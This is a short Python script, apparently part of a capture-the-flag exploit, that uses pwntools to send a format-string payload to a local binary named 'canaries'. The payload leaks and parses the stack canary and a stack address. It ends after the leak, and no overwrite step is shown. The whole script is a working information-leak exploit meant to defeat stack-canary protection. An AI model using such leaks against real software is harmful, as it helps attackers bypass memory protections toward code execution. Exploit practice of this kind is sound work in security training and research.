from pwn import *
p=process('./canaries')
p.recv()
p.sendline("iiii"+"%130$x"+"%1$x")
leak=p.recv()
canary=leak[4:12]
buff=leak[12:20]
print canary
print buff
canary = int(canary,16)
buff=int(buff,16)
